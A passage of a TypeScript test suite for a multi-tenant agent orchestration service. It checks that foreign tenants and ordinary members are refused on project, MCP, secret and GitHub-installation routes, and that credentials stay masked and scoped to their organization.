    ["POST", `/api/runs/${run.id}/rollback`],
    ["POST", `/api/runs/${run.id}/cancel`],
    ["GET", `/api/runs/${run.id}/transcript`],
    // The SSE stream: for a foreign tenant it must refuse before it
    // ever streams, and it now carries unpersisted draft text that no
    // RLS policy can cover, so the matrix is the only thing pinning it.
    ["GET", `/api/runs/${run.id}/events`],
    ["GET", `/api/board/${project.id}/events`],
    ["GET", `/api/board/${project.id}/events`],
    ["POST", "/api/linear/mappings", { body: JSON.stringify({ linearTeamId: "team-x", projectId: project.id }) }],
    ["DELETE", "/api/linear/mappings/00000000-0000-0000-0000-000000000000"],
    ["PATCH", "/api/linear/settings", { body: JSON.stringify({ defaultProjectId: project.id }) }],
    [
      "PATCH",
      `/api/linear/projects/${project.id}/settings`,
      { body: JSON.stringify({ createIssues: true, teamId: "team-x" }) },
    ],
    ["GET", "/api/linear/projects?teamId=team-x"],
    ["POST", "/api/linear/import", { body: JSON.stringify({ issueIds: ["issue-x"], projectId: project.id }) }],
    ["PATCH", "/api/slack/settings", { body: JSON.stringify({ defaultProjectId: project.id }) }],
    ["PATCH", `/api/mcp/${mcpServer!.id}`, { body: JSON.stringify({ name: "stolen" }) }],
    ["POST", `/api/mcp/${mcpServer!.id}/api-key`, { body: JSON.stringify({ value: "sk-injected" }) }],
    ["DELETE", `/api/mcp/${mcpServer!.id}/credential`],
    ["POST", `/api/mcp/${mcpServer!.id}/connect`],
    ["DELETE", `/api/mcp/${mcpServer!.id}/user-credential`],
    ["DELETE", `/api/mcp/${mcpServer!.id}`],
    ["DELETE", `/api/features/${feature.id}`],
    // Last: a delete that went through would refuse everything after it
    // for the wrong reason. The project last, because it would take the
    // card with it and make the check below 404 for the wrong reason.
    ["DELETE", `/api/projects/${project.id}`],
  ];

  for (const [method, path, init] of attempts) {
    const res = await asIntruder(path, { method, ...(init ?? {}) });
    assert.ok(
      res.status === 404 || res.status === 400,
      `${method} ${path} answered ${res.status} to a foreign tenant; it must refuse`,
    );
  }

  // The card is still on the owner's board. A refusal that answered
  // 404 and deleted the row anyway would pass the loop above and lose
  // somebody else's work, which is the one failure the status code
  // cannot show.
  const stillThere = await asOwner(`/api/features/${feature.id}`);
  assert.equal(stillThere.status, 200, "the intruder's DELETE must not have removed the owner's card");

  // The MCP server row survived, under its own name. Read through
  // ctx.db because the org-less owner cannot use the routes either.
  const [mcpAfter] = await ctx.db
    .select({ name: mcpServers.name })
    .from(mcpServers)
    .where(eq(mcpServers.id, mcpServer!.id));
  assert.equal(mcpAfter?.name, "Matrix MCP", "the intruder must not have renamed or deleted the MCP server");

  // The project is still there, under its own name.
  const projectAfter = await asOwner(`/api/projects/${project.id}`);
  assert.equal(projectAfter.status, 200, "the intruder must not have deleted the owner's project");
  const projectBody = (await projectAfter.json()) as { name: string; autoStartPipeline: boolean };
  assert.equal(projectBody.name, "Matrix", "the intruder must not have renamed the owner's project");
  // A flag flipped from outside would put an agent on every issue this
  // team's Linear files, which is spend the intruder chose for them.
  assert.equal(
    projectBody.autoStartPipeline,
    false,
    "the intruder must not have turned on auto-start for the owner's project",
  );

  // The agent is still the owner's, under its own name. A rename that
  // went through would be one tenant editing another's agent, and a
  // delete that went through would take a stage's agent with it.
  const profilesAfter = (await (await asOwner("/api/profiles")).json()) as { id: string; name: string }[];
  const mine = profilesAfter.find((p) => p.id === profile.id);
  assert.equal(mine?.name, "m", "the intruder must not have renamed or removed the owner's agent");

  const ownerAgents = await (await asOwner("/api/profiles/export")).text();
  assert.match(ownerAgents, /name: m/);
  const intruderAgents = await (await asIntruder("/api/profiles/export")).text();
  assert.doesNotMatch(intruderAgents, /name: m/, "a foreign tenant's export must not include this agent's name");
  const stealAgents = await asIntruder("/api/profiles/import", {
    method: "POST",
    headers: { "content-type": "application/yaml" },
    body: "version: 1\nagents:\n  - name: m\n    tool: fake\n    model: fake-1\n    skill: stolen\n",
  });
  assert.ok(stealAgents.status === 200 || stealAgents.status === 400);
  const profilesAfterImport = (await (await asOwner("/api/profiles")).json()) as {
    id: string;
    name: string;
    skill: string | null;
  }[];
  const stillMine = profilesAfterImport.find((p) => p.id === profile.id);
  assert.notEqual(stillMine?.skill, "stolen", "the intruder's import must not rewrite the owner's agent");

  // Refusal must not have mutated anything: not the stage's criteria,
  // and not the repository list either. A repository the intruder added
  // would be a path the owner's agents then check out.
  const reposAfter = (await (await asOwner(`/api/projects/${project.id}/repositories`)).json()) as {
    localPath: string;
  }[];
  assert.ok(
    !reposAfter.some((r) => r.localPath === "/tmp/injected"),
    "the intruder's repository must not land in the owner's project",
  );

  // Stages ship with a manual gate, so the check is that no command
  // criterion was injected: that is the one that would run in the
  // owner's sandbox.
  const stage = (await (await asOwner(`/api/stages/${stageId}`)).json()) as {
    gateCriteria: { type: string }[];
  };
  assert.ok(
    !stage.gateCriteria.some((criterion) => criterion.type === "command"),
    "the intruder's gateCriteria write must not land",
  );
});

/**
 * MCP servers are org infrastructure: every member sees the registry
 * (their runs use it, and per-user servers ask them to connect), but
 * only owners and admins may define servers or hold the org credential.
 */
test("members read the MCP registry and only admins manage it", async () => {
  const admin = await jsonPost("/api/auth/sign-up/email", {
    email: "mcp-admin@bento.test",
    password: "correct-horse-battery",
    name: "Admin",
  });
  const memberUser = await jsonPost("/api/auth/sign-up/email", {
    email: "mcp-member@bento.test",
    password: "correct-horse-battery",
    name: "Member",
  });
  const adminToken = admin.headers.get("set-auth-token")!;
  const memberToken = memberUser.headers.get("set-auth-token")!;

  const org = (await (
    await jsonPost("/api/auth/organization/create", { name: "MCP Org", slug: "mcp-org" }, adminToken)
  ).json()) as { id: string };
  await jsonPost("/api/auth/organization/set-active", { organizationId: org.id }, adminToken);
  const invite = (await (
    await jsonPost(
      "/api/auth/organization/invite-member",
      { email: "mcp-member@bento.test", role: "member", organizationId: org.id },
      adminToken,
    )
  ).json()) as { id: string };
  await jsonPost("/api/auth/organization/accept-invitation", { invitationId: invite.id }, memberToken);
  await jsonPost("/api/auth/organization/set-active", { organizationId: org.id }, memberToken);

  const created = await jsonPost(
    "/api/mcp",
    { name: "Docs", slug: "docs", url: "https://mcp.example.test/mcp", authType: "api_key" },
    adminToken,
  );
  assert.equal(created.status, 201);
  const server = (await created.json()) as { id: string };

  const asMember = (path: string, init: RequestInit = {}) =>
    app.request(path, {
      ...init,
      headers: { "content-type": "application/json", authorization: `Bearer ${memberToken}`, ...(init.headers ?? {}) },
    });

  const status = await asMember("/api/mcp/status");
  assert.equal(status.status, 200);
  const body = (await status.json()) as { canManage: boolean; servers: { id: string }[] };
  assert.equal(body.canManage, false, "a member must see the registry without manage rights");
  assert.equal(body.servers.length, 1, "a member must see the org's servers");

  const refusals = [
    await asMember("/api/mcp", {
      method: "POST",
      body: JSON.stringify({ name: "X", slug: "x", url: "https://x.test/mcp", authType: "none" }),
    }),
    await asMember(`/api/mcp/${server.id}`, { method: "PATCH", body: JSON.stringify({ name: "stolen" }) }),
    await asMember(`/api/mcp/${server.id}/api-key`, { method: "POST", body: JSON.stringify({ value: "sk-x" }) }),
    await asMember(`/api/mcp/${server.id}/credential`, { method: "DELETE" }),
    await asMember(`/api/mcp/${server.id}`, { method: "DELETE" }),
  ];
  for (const res of refusals) {
    assert.equal(res.status, 403, "a member must not manage MCP servers");
  }

  // A user from another organization aiming at the same id must land on
  // 404, indistinguishable from the id not existing.
  const outsider = await jsonPost("/api/auth/sign-up/email", {
    email: "mcp-outsider@bento.test",
    password: "correct-horse-battery",
    name: "Outsider",
  });
  const outsiderToken = outsider.headers.get("set-auth-token")!;
  const foreignOrg = (await (
    await jsonPost("/api/auth/organization/create", { name: "Foreign", slug: "mcp-foreign" }, outsiderToken)
  ).json()) as { id: string };
  await jsonPost("/api/auth/organization/set-active", { organizationId: foreignOrg.id }, outsiderToken);
  const asOutsider = (path: string, init: RequestInit = {}) =>
    app.request(path, {
      ...init,
      headers: { "content-type": "application/json", authorization: `Bearer ${outsiderToken}`, ...(init.headers ?? {}) },
    });
  const foreignAttempts = [
    await asOutsider(`/api/mcp/${server.id}`, { method: "PATCH", body: JSON.stringify({ name: "stolen" }) }),
    await asOutsider(`/api/mcp/${server.id}/api-key`, { method: "POST", body: JSON.stringify({ value: "sk-x" }) }),
    await asOutsider(`/api/mcp/${server.id}/credential`, { method: "DELETE" }),
    await asOutsider(`/api/mcp/${server.id}`, { method: "DELETE" }),
  ];
  for (const res of foreignAttempts) {
    assert.equal(res.status, 404, "a foreign tenant must see nothing but 404 for another org's MCP server");
  }
  const survived = await app.request("/api/mcp/status", {
    headers: { authorization: `Bearer ${adminToken}` },
  });
  const after = (await survived.json()) as { servers: { id: string; name: string }[] };
  assert.equal(after.servers[0]?.name, "Docs", "the outsider must not have touched the org's MCP server");
});

/**
 * A personal MCP server is one member's own. Any member may add one, a
 * teammate never sees it, and an admin may only turn it off or remove
 * it, never read or store its credentials.
 */
test("a personal MCP server is invisible to teammates and governance-only to admins", async () => {
  const admin = await jsonPost("/api/auth/sign-up/email", {
    email: "pers-admin@bento.test",
    password: "correct-horse-battery",
    name: "Admin",
  });
  const alice = await jsonPost("/api/auth/sign-up/email", {
    email: "pers-alice@bento.test",
    password: "correct-horse-battery",
    name: "Alice",
  });
  const bob = await jsonPost("/api/auth/sign-up/email", {
    email: "pers-bob@bento.test",
    password: "correct-horse-battery",
    name: "Bob",
  });
  const adminToken = admin.headers.get("set-auth-token")!;
  const aliceToken = alice.headers.get("set-auth-token")!;
  const bobToken = bob.headers.get("set-auth-token")!;

  const org = (await (
    await jsonPost("/api/auth/organization/create", { name: "Personal Org", slug: "personal-org" }, adminToken)
  ).json()) as { id: string };
  await jsonPost("/api/auth/organization/set-active", { organizationId: org.id }, adminToken);
  for (const [email, token] of [["pers-alice@bento.test", aliceToken], ["pers-bob@bento.test", bobToken]] as const) {
    const invite = (await (
      await jsonPost(
        "/api/auth/organization/invite-member",
        { email, role: "member", organizationId: org.id },
        adminToken,
      )
    ).json()) as { id: string };
    await jsonPost("/api/auth/organization/accept-invitation", { invitationId: invite.id }, token);
    await jsonPost("/api/auth/organization/set-active", { organizationId: org.id }, token);
  }

  const as = (token: string) => (path: string, init: RequestInit = {}) =>
    app.request(path, {
      ...init,
      headers: { "content-type": "application/json", authorization: `Bearer ${token}`, ...(init.headers ?? {}) },
    });

  // A member, not an admin, may add a personal server.
  const created = await as(aliceToken)("/api/mcp", {
    method: "POST",
    body: JSON.stringify({ name: "Alice notes", slug: "notes", url: "https://mcp.example.test/mcp", authType: "none", personal: true }),
  });
  assert.equal(created.status, 201, "a member can add a personal server");
  const server = (await created.json()) as { id: string };

  // Bob cannot see it, and cannot act on it (404, not 403, so he cannot
  // even learn it exists).
  const bobStatus = (await (await as(bobToken)("/api/mcp/status")).json()) as { servers: { id: string }[] };
  assert.ok(!bobStatus.servers.some((s) => s.id === server.id), "a teammate does not see a personal server");
  const bobPatch = await as(bobToken)(`/api/mcp/${server.id}`, { method: "PATCH", body: JSON.stringify({ name: "x" }) });
  assert.equal(bobPatch.status, 404, "a teammate cannot touch a personal server");
  const bobDelete = await as(bobToken)(`/api/mcp/${server.id}`, { method: "DELETE" });
  assert.equal(bobDelete.status, 404);

  // The admin sees it, named by owner, and may disable it, but cannot
  // rename it or store a credential for it.
  const adminStatus = (await (await as(adminToken)("/api/mcp/status")).json()) as {
    servers: { id: string; personal: boolean; ownerName: string | null }[];
  };
  const seen = adminStatus.servers.find((s) => s.id === server.id);
  assert.ok(seen?.personal, "an admin sees a teammate's personal server");
  assert.equal(seen?.ownerName, "Alice", "named by its owner");
  const adminDisable = await as(adminToken)(`/api/mcp/${server.id}`, { method: "PATCH", body: JSON.stringify({ enabled: false }) });
  assert.equal(adminDisable.status, 200, "an admin may disable a personal server");
  const adminRename = await as(adminToken)(`/api/mcp/${server.id}`, { method: "PATCH", body: JSON.stringify({ name: "renamed" }) });
  assert.equal(adminRename.status, 403, "an admin may not edit a personal server's shape");

  // The owner may remove it.
  const aliceDelete = await as(aliceToken)(`/api/mcp/${server.id}`, { method: "DELETE" });
  assert.equal(aliceDelete.status, 200, "the owner may remove their own personal server");
});

/**
 * Removing a member deletes their own MCP connections. The gateway
 * already stops serving them the moment they leave (it re-reads live
 * membership), so this is the hygiene that removes the rows.
 */
test("removing a member deletes their per-user MCP credentials", async () => {
  const admin = await jsonPost("/api/auth/sign-up/email", {
    email: "rm-admin@bento.test",
    password: "correct-horse-battery",
    name: "Admin",
  });
  const leaver = await jsonPost("/api/auth/sign-up/email", {
    email: "rm-leaver@bento.test",
    password: "correct-horse-battery",
    name: "Leaver",
  });
  const adminToken = admin.headers.get("set-auth-token")!;
  const leaverToken = leaver.headers.get("set-auth-token")!;

  const org = (await (
    await jsonPost("/api/auth/organization/create", { name: "Leaving", slug: "leaving-org" }, adminToken)
  ).json()) as { id: string };
  await jsonPost("/api/auth/organization/set-active", { organizationId: org.id }, adminToken);
  const invite = (await (
    await jsonPost(
      "/api/auth/organization/invite-member",
      { email: "rm-leaver@bento.test", role: "member", organizationId: org.id },
      adminToken,
    )
  ).json()) as { id: string };
  await jsonPost("/api/auth/organization/accept-invitation", { invitationId: invite.id }, leaverToken);

  const server = (await (
    await app.request("/api/mcp", {
      method: "POST",
      headers: { "content-type": "application/json", authorization: `Bearer ${adminToken}` },
      body: JSON.stringify({ name: "Notion", slug: "notion", url: "https://mcp.example.test/mcp", authType: "oauth", credentialScope: "user" }),
    })
  ).json()) as { id: string };

  // The leaver's own connection, inserted directly (the OAuth round trip
  // is covered elsewhere).
  const [leaverRow] = await ctx.db.select({ id: user.id }).from(user).where(eq(user.email, "rm-leaver@bento.test"));
  await ctx.db.insert(mcpCredentials).values({
    serverId: server.id,
    organizationId: org.id,
    userId: leaverRow!.id,
    kind: "oauth",
    encryptedSecret: ctx.secretBox.encrypt("leaver-token"),
  });

  await jsonPost(
    "/api/auth/organization/remove-member",
    { memberIdOrEmail: "rm-leaver@bento.test", organizationId: org.id },
    adminToken,
  );

  const remaining = await ctx.db
    .select()
    .from(mcpCredentials)
    .where(and(eq(mcpCredentials.serverId, server.id), eq(mcpCredentials.userId, leaverRow!.id)));
  assert.equal(remaining.length, 0, "the removed member's MCP credential must be deleted");
});

/**
 * History names the person who moved the card. "by a person" told a
 * team nothing about who approved or dragged something, and the actor
 * was already stored; the list just never resolved them.
 */
test("history names the person who moved the card", async () => {
  const signed = await jsonPost("/api/auth/sign-up/email", {
    email: "history-actor@bento.test",
    password: "correct-horse-battery",
    name: "Ada Lovelace",
  });
  const token = signed.headers.get("set-auth-token")!;
  const org = (await (
    await jsonPost("/api/auth/organization/create", { name: "History", slug: "history-actor" }, token)
  ).json()) as { id: string };
  await jsonPost("/api/auth/organization/set-active", { organizationId: org.id }, token);

  const asUser = (path: string, init: RequestInit = {}) =>
    app.request(path, {
      ...init,
      headers: {
        "content-type": "application/json",
        authorization: `Bearer ${token}`,
        ...(init.headers ?? {}),
      },
    });

  const project = (await (
    await asUser("/api/projects", { method: "POST", body: JSON.stringify({ name: "Named", localPath: "/tmp" }) })
  ).json()) as { id: string };
  const pipeline = (await (await asUser(`/api/projects/${project.id}/pipeline`)).json()) as {
    stages: { id: string }[];
  };
  for (const stage of pipeline.stages) {
    await asUser(`/api/stages/${stage.id}`, {
      method: "PATCH",
      body: JSON.stringify({ defaultAgentProfileId: null }),
    });
  }
  const feature = (await (
    await asUser("/api/features", { method: "POST", body: JSON.stringify({ projectId: project.id, title: "Who" }) })
  ).json()) as { id: string };
  const advanced = await asUser(`/api/features/${feature.id}/advance`, { method: "POST" });
  assert.equal(advanced.status, 200);

  const history = (await (await asUser(`/api/features/${feature.id}/history`)).json()) as {
    trigger: string;
    actorName: string | null;
    actorEmail: string | null;
  }[];
  const moved = history.find((event) => event.trigger === "manual");
  assert.ok(moved, "advancing the card writes a manual history row");
  assert.equal(moved.actorName, "Ada Lovelace");
  assert.equal(moved.actorEmail, "history-actor@bento.test");

  const plain = await (await asUser(`/api/features/${feature.id}/history/plain`)).text();
  assert.match(plain, /by Ada Lovelace/);
  assert.doesNotMatch(plain, /by a person/);
});

/**
 * Agent credentials come from the organization, never the server.
 *
 * This is the boundary that lets a hosted deployment run tenant agents
 * at all: an agent can read anything its sandbox can, so the operator's
 * own key must never be in there.
 */
test("agent credentials are per organization and write only", async () => {
  const user = await jsonPost("/api/auth/sign-up/email", {
    email: "secrets@bento.test",
    password: "correct-horse-battery",
    name: "Secrets",
  });
  const token = user.headers.get("set-auth-token")!;
  const org = (await (
    await jsonPost("/api/auth/organization/create", { name: "Keys Inc", slug: "keys-inc" }, token)
  ).json()) as { id: string };
  await jsonPost("/api/auth/organization/set-active", { organizationId: org.id }, token);

  const created = await jsonPost("/api/secrets", { name: "ANTHROPIC_API_KEY", value: "sk-ant-secret-1234" }, token);
  assert.equal(created.status, 201);

  const listed = (await (
    await app.request("/api/secrets", { headers: { authorization: `Bearer ${token}` } })
  ).json()) as { secrets: { name: string; hint: string }[]; canManage: boolean };
  assert.equal(listed.canManage, true);
  assert.equal(listed.secrets.length, 1);
  assert.equal(listed.secrets[0]?.name, "ANTHROPIC_API_KEY");
  assert.equal(listed.secrets[0]?.hint, "••••••••1234");
  assert.doesNotMatch(JSON.stringify(listed), /sk-ant-secret/, "no route may return the value");

  // A name outside the catalog would be stored but never forwarded.
  const bogus = await jsonPost("/api/secrets", { name: "NOT_A_REAL_CREDENTIAL", value: "x" }, token);
  assert.equal(bogus.status, 400);

  // Another organization sees none of it.
  const outsider = await jsonPost("/api/auth/sign-up/email", {
    email: "outsider-secrets@bento.test",
    password: "correct-horse-battery",
    name: "Outsider",
  });
  const outsiderToken = outsider.headers.get("set-auth-token")!;
  const theirs = (await (
    await app.request("/api/secrets", { headers: { authorization: `Bearer ${outsiderToken}` } })
  ).json()) as { secrets: unknown[] };
  assert.equal(theirs.secrets.length, 0, "secrets must not cross organizations");

  // The line form the Mac app reads is a second route over the same
  // rows, so it needs the same two assertions rather than inheriting
  // them: it masks the value, and it does not cross organizations.
  const mine = await (await app.request("/api/secrets/plain", { headers: { authorization: `Bearer ${token}` } })).text();
  assert.match(mine, /^secret\|[^|]+\|ANTHROPIC_API_KEY\|••••••••1234$/m);
  assert.doesNotMatch(mine, /sk-ant-secret/, "the line form must mask the value too");
  const theirsPlain = await (
    await app.request("/api/secrets/plain", { headers: { authorization: `Bearer ${outsiderToken}` } })
  ).text();
  assert.equal(theirsPlain, "", "the line form must not cross organizations either");
});

test("credential access follows current membership and mutation roles", async () => {
  const owner = await jsonPost("/api/auth/sign-up/email", {
    email: "credential-owner@bento.test",
    password: "correct-horse-battery",
    name: "Credential Owner",
  });
  const teammate = await jsonPost("/api/auth/sign-up/email", {
    email: "credential-member@bento.test",
    password: "correct-horse-battery",
    name: "Credential Member",
  });
  const ownerToken = owner.headers.get("set-auth-token")!;
  const teammateToken = teammate.headers.get("set-auth-token")!;
  const teammateId = ((await teammate.json()) as { user: { id: string } }).user.id;

  const organization = (await (
    await jsonPost("/api/auth/organization/create", { name: "Credential Roles", slug: "credential-roles" }, ownerToken)
  ).json()) as { id: string };
  await jsonPost("/api/auth/organization/set-active", { organizationId: organization.id }, ownerToken);

  const original = await jsonPost(
    "/api/secrets",
    { name: "ANTHROPIC_API_KEY", value: "owner-secret-value" },
    ownerToken,
  );
  assert.equal(original.status, 201);
  const originalId = ((await original.json()) as { id: string }).id;

  const invitation = (await (
    await jsonPost(
      "/api/auth/organization/invite-member",
      { email: "credential-member@bento.test", role: "member", organizationId: organization.id },
      ownerToken,
    )
  ).json()) as { id: string };
  await jsonPost("/api/auth/organization/accept-invitation", { invitationId: invitation.id }, teammateToken);
  await jsonPost("/api/auth/organization/set-active", { organizationId: organization.id }, teammateToken);

  const visible = (await (
    await app.request("/api/secrets", { headers: { authorization: `Bearer ${teammateToken}` } })
  ).json()) as { secrets: { id: string }[]; canManage: boolean };
  assert.deepEqual(visible.secrets.map((secret) => secret.id), [originalId], "members may use the organization's credentials");
  assert.equal(visible.canManage, false, "members must not be offered credential controls");

  const memberCreate = await jsonPost(
    "/api/secrets",
    { name: "OPENAI_API_KEY", value: "member-must-not-write" },
    teammateToken,
  );
  assert.equal(memberCreate.status, 403);
  const memberDelete = await app.request(`/api/secrets/${originalId}`, {
    method: "DELETE",
    headers: { authorization: `Bearer ${teammateToken}` },
  });
  assert.equal(memberDelete.status, 403);

  await ctx.db
    .update(member)
    .set({ role: "admin" })
    .where(and(eq(member.userId, teammateId), eq(member.organizationId, organization.id)));
  const adminCreate = await jsonPost(
    "/api/secrets",
    { name: "OPENAI_API_KEY", value: "admin-secret-value" },
    teammateToken,
  );
  assert.equal(adminCreate.status, 201, "an admin may add credentials");
  const adminSecretId = ((await adminCreate.json()) as { id: string }).id;
  const adminDelete = await app.request(`/api/secrets/${originalId}`, {
    method: "DELETE",
    headers: { authorization: `Bearer ${teammateToken}` },
  });
  assert.equal(adminDelete.status, 200, "an admin may remove credentials");
  const ownedProject = await jsonPost(
    "/api/projects",
    { name: "Removed member project", localPath: "/tmp/removed-member-project" },
    teammateToken,
  );
  assert.equal(ownedProject.status, 201);
  const ownedProjectId = ((await ownedProject.json()) as { id: string }).id;

  // The session still names this organization after membership is
  // removed. Every secret route must re-read membership and refuse it.
  await ctx.db
    .delete(member)
    .where(and(eq(member.userId, teammateId), eq(member.organizationId, organization.id)));
  const staleList = await app.request("/api/secrets", {
    headers: { authorization: `Bearer ${teammateToken}` },
  });
  assert.deepEqual(await staleList.json(), { secrets: [], canManage: false });
  const stalePlain = await app.request("/api/secrets/plain", {
    headers: { authorization: `Bearer ${teammateToken}` },
  });
  assert.equal(await stalePlain.text(), "");
  const staleCreate = await jsonPost(
    "/api/secrets",
    { name: "ANTHROPIC_API_KEY", value: "stale-must-not-write" },
    teammateToken,
  );
  assert.equal(staleCreate.status, 404);
  const staleDelete = await app.request(`/api/secrets/${adminSecretId}`, {
    method: "DELETE",
    headers: { authorization: `Bearer ${teammateToken}` },
  });
  assert.equal(staleDelete.status, 404);
  const staleProject = await app.request(`/api/projects/${ownedProjectId}`, {
    headers: { authorization: `Bearer ${teammateToken}` },
  });
  assert.equal(staleProject.status, 404, "creating the project does not preserve access after membership removal");

  const ownerStillSees = (await (
    await app.request("/api/secrets", { headers: { authorization: `Bearer ${ownerToken}` } })
  ).json()) as { secrets: { id: string }[]; canManage: boolean };
  assert.equal(ownerStillSees.canManage, true);
  assert.deepEqual(ownerStillSees.secrets.map((secret) => secret.id), [adminSecretId], "stale requests must not mutate secrets");
});

test("a GitHub App installation is bound to the active organization", async () => {
  const signedUp = await jsonPost("/api/auth/sign-up/email", {
    email: "github-owner@bento.test",
    password: "correct-horse-battery",
    name: "GitHub Owner",
  });
  const token = signedUp.headers.get("set-auth-token")!;
  const userId = ((await signedUp.json()) as { user: { id: string } }).user.id;
  const organization = (await (
    await jsonPost("/api/auth/organization/create", { name: "GitHub Team", slug: "github-team" }, token)
  ).json()) as { id: string };
  await jsonPost("/api/auth/organization/set-active", { organizationId: organization.id }, token);
  await ctx.db.insert(account).values({
    id: "github-account-for-install-test",
    accountId: "12345",
    providerId: "github",
    userId,
    accessToken: "github-user-token",
  });

  const originalFetch = globalThis.fetch;
  const originalApp = ctx.githubApp;
  const mutableEnv = ctx.env as typeof ctx.env & {
    GITHUB_APP_SLUG?: string;
    BENTO_SECRET_KEY?: string;
    GITHUB_WEBHOOK_SECRET?: string;
  };
  const originalSlug = mutableEnv.GITHUB_APP_SLUG;
  const originalKey = mutableEnv.BENTO_SECRET_KEY;
  const originalWebhookSecret = mutableEnv.GITHUB_WEBHOOK_SECRET;
  mutableEnv.GITHUB_APP_SLUG = "bento-test";
  mutableEnv.BENTO_SECRET_KEY = "github-install-state-key-at-least-32-characters";
  mutableEnv.GITHUB_WEBHOOK_SECRET = "github-webhook-test-secret";
  ctx.githubApp = {
    async installation(id: string) {
      return { id, accountLogin: "acme", accountType: "Organization" };
    },
    forInstallation() {
      return {
        async listRepositories() {
          return [{
            id: 99,
            name: "api",
            fullName: "acme/api",
            owner: "acme",
            url: "https://github.com/acme/api",
            cloneUrl: "https://github.com/acme/api.git",
            defaultBranch: "main",
          }];
        },
      };
    },
  } as unknown as NonNullable<AppContext["githubApp"]>;
  globalThis.fetch = (async (url: string | URL | Request) => {
    assert.match(String(url), /api\.github\.com\/user\/installations/);
    return Response.json({ installations: [{ id: 77 }] });
  }) as typeof fetch;

  try {
    const begin = await jsonPost("/api/github/install", {}, token);
    assert.equal(begin.status, 200);
    const installUrl = new URL(((await begin.json()) as { url: string }).url);
    assert.equal(installUrl.hostname, "github.com");
    const state = installUrl.searchParams.get("state");
    assert.ok(state);

    const callback = await app.request(
      `/api/github/callback?installation_id=77&state=${encodeURIComponent(state)}`,
      { headers: { authorization: `Bearer ${token}` } },
    );
    assert.equal(callback.status, 302);

    const status = await app.request("/api/github/status", {
      headers: { authorization: `Bearer ${token}` },
    });
    assert.deepEqual(await status.json(), {
      configured: true,
      connected: true,
      // An installation is a way to publish, which is the question the
      // pull request controls actually ask.
      canPublish: true,
      canManage: true,
      installation: { accountLogin: "acme", accountType: "Organization" },
      // This account was given a GitHub identity above, which is what
      // let the install bind at all.
      identityLinked: true,
      // No GitHub sign in is configured on this test server, so there
      // would be nothing to offer someone without one.
      canLinkIdentity: false,
    });
    const repositories = await app.request("/api/github/repositories", {
      headers: { authorization: `Bearer ${token}` },
    });
    assert.equal(((await repositories.json()) as { id: number }[])[0]?.id, 99);

    const project = await jsonPost(
      "/api/projects",
      { name: "Installed repository", repositories: [{ githubRepoId: "99" }] },
      token,
    );
    assert.equal(project.status, 201);
    const projectId = ((await project.json()) as { id: string }).id;
    const selected = await app.request(`/api/projects/${projectId}/repositories`, {
      headers: { authorization: `Bearer ${token}` },
    });
    assert.deepEqual(
      ((await selected.json()) as { githubRepoId: string; repoUrl: string }[]).map((repo) => ({
        githubRepoId: repo.githubRepoId,
        repoUrl: repo.repoUrl,
      })),
      [{ githubRepoId: "99", repoUrl: "https://github.com/acme/api" }],
    );
    const unauthorized = await jsonPost(
      "/api/projects",
      { name: "Not granted", repositories: [{ githubRepoId: "100" }] },
      token,
    );
    assert.equal(unauthorized.status, 400);

    const webhookBody = JSON.stringify({ action: "deleted", installation: { id: 77 } });
    const signature = `sha256=${createHmac("sha256", mutableEnv.GITHUB_WEBHOOK_SECRET).update(webhookBody).digest("hex")}`;
    const removed = await app.request("/api/webhooks/github", {
      method: "POST",
      headers: {
        "content-type": "application/json",
        "x-github-event": "installation",
        "x-hub-signature-256": signature,
      },
      body: webhookBody,
    });
    assert.equal(removed.status, 200);
    const disconnected = await app.request("/api/github/status", {
      headers: { authorization: `Bearer ${token}` },
    });
    assert.equal(((await disconnected.json()) as { connected: boolean }).connected, false);
  } finally {
    globalThis.fetch = originalFetch;
    if (originalApp) ctx.githubApp = originalApp;
    else delete ctx.githubApp;
    if (originalSlug === undefined) delete mutableEnv.GITHUB_APP_SLUG;
    else mutableEnv.GITHUB_APP_SLUG = originalSlug;
    if (originalKey === undefined) delete mutableEnv.BENTO_SECRET_KEY;
    else mutableEnv.BENTO_SECRET_KEY = originalKey;
    if (originalWebhookSecret === undefined) delete mutableEnv.GITHUB_WEBHOOK_SECRET;
    else mutableEnv.GITHUB_WEBHOOK_SECRET = originalWebhookSecret;
  }
});

/**
 * The journey of an account that never touched GitHub to sign in.
 *
 * Binding an installation is only allowed for someone GitHub already
 * shows it to, and an account made with an email and a password has no
 * GitHub identity to ask. That used to be discovered on the way back
 * from GitHub, as a JSON refusal in a browser tab, with nothing on
 * offer that would fix it. Now the console can see the missing step
 * before it offers the button, every refusal names what to do, and
 * attaching an identity makes the same install work.
 */
test("an account signed up with a password can install once GitHub is connected", async () => {
  const signedUp = await jsonPost("/api/auth/sign-up/email", {
    email: "password-only@bento.test",
    password: "correct-horse-battery",
    name: "Password Only",
  });
  const token = signedUp.headers.get("set-auth-token")!;
  const userId = ((await signedUp.json()) as { user: { id: string } }).user.id;
  const organization = (await (
    await jsonPost("/api/auth/organization/create", { name: "Password Team", slug: "password-team" }, token)
  ).json()) as { id: string };
  await jsonPost("/api/auth/organization/set-active", { organizationId: organization.id }, token);

  const originalFetch = globalThis.fetch;
  const originalApp = ctx.githubApp;
  const mutableEnv = ctx.env as typeof ctx.env & {
    GITHUB_APP_SLUG?: string;
    GITHUB_APP_ID?: string;
    GITHUB_CLIENT_ID?: string;
    GITHUB_CLIENT_SECRET?: string;
    BENTO_SECRET_KEY?: string;
  };
  const saved = {
    slug: mutableEnv.GITHUB_APP_SLUG,
    appId: mutableEnv.GITHUB_APP_ID,
    clientId: mutableEnv.GITHUB_CLIENT_ID,
    clientSecret: mutableEnv.GITHUB_CLIENT_SECRET,
    key: mutableEnv.BENTO_SECRET_KEY,
  };
  mutableEnv.GITHUB_APP_SLUG = "bento-test";
  mutableEnv.GITHUB_APP_ID = "4242";
  mutableEnv.GITHUB_CLIENT_ID = "client-id";
  mutableEnv.GITHUB_CLIENT_SECRET = "client-secret";
  mutableEnv.BENTO_SECRET_KEY = "github-install-state-key-at-least-32-characters";
  ctx.githubApp = {
    async installation(id: string) {
      return { id, accountLogin: "acme", accountType: "Organization" };
    },
    forInstallation() {
      return { async listRepositories() { return []; } };
    },
  } as unknown as NonNullable<AppContext["githubApp"]>;

  /** What GitHub answers the user token with, per stage of the story. */
  let githubReply: () => Response = () => {
    throw new Error("GitHub must not be asked for a user with no linked account");
  };
  globalThis.fetch = (async () => githubReply()) as typeof fetch;

  /** A signed install state, the way the console gets one. */
  async function beginInstall(): Promise<string> {
    const begin = await jsonPost("/api/github/install", {}, token);
    assert.equal(begin.status, 200);
    const url = new URL(((await begin.json()) as { url: string }).url);
